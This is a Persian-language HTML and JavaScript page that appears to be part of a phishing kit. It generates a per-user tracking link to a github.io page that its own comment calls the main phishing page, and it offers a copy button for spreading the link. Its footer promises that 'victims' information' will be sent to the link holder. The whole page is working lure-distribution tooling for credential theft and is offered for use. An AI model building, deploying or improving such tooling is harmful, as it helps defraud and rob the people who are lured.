<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ساخت لینک اختصاصی</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Tahoma, sans-serif;
        }
        body {
            background: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            direction: rtl;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 500px;
            text-align: center;
        }
        .title {
            font-size: 22px;
            font-weight: bold;
            color: #1a2a3a;
            margin-bottom: 10px;
        }
        .sub {
            font-size: 14px;
            color: #6c7a8a;
            margin-bottom: 20px;
        }
        .link-box {
            background: #f0f4ff;
            padding: 15px;
            border-radius: 12px;
            border: 2px dashed #1a7ae8;
            word-break: break-all;
            font-size: 14px;
            color: #1a2a3a;
            direction: ltr;
            text-align: center;
        }
        .copy-btn {
            margin-top: 15px;
            padding: 10px 20px;
            background: #1a7ae8;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .copy-btn:hover {
            background: #0f5bb5;
        }
        .note {
            margin-top: 20px;
            font-size: 12px;
            color: #94a3b8;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="title">🔗 لینک اختصاصی شما</div>
    <div class="sub">این لینک مخصوص شماست. آن را برای دیگران ارسال کنید.</div>

    <div class="link-box" id="uniqueLink">در حال ایجاد لینک...</div>

    <button class="copy-btn" onclick="copyLink()">📋 کپی لینک</button>

    <div class="note">✅ اطلاعات قربانیان به شما ارسال خواهد شد.</div>
</div>

<script>
    // =============================================
    // لینک اصلی صفحه فیشینگ
    // =============================================
    const BASE_URL = 'https://8080602.github.io/8080/';

    // =============================================
    // ساخت شناسه یکتا (UUID)
    // =============================================
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    // =============================================
    // دریافت یا ساخت شناسه کاربر
    // =============================================
    function getUserId() {
        let userId = localStorage.getItem('phishing_user_id');
        if (!userId) {
            userId = generateUUID();
            localStorage.setItem('phishing_user_id', userId);
        }
        return userId;
    }

    const USER_ID = getUserId();
    const UNIQUE_LINK = BASE_URL + '?user_id=' + USER_ID;

    // =============================================
    // نمایش لینک در صفحه
    // =============================================
    document.getElementById('uniqueLink').textContent = UNIQUE_LINK;

    // =============================================
    // کپی لینک
    // =============================================
    function copyLink() {
        navigator.clipboard.writeText(UNIQUE_LINK).then(() => {
            alert('✅ لینک کپی شد!');
        }).catch(() => {
            alert('❌ خطا در کپی');
        });
    }

    console.log('🆔 شناسه کاربر:', USER_ID);
    console.log('🔗 لینک اختصاصی:', UNIQUE_LINK);
</script>

</body>
</html>
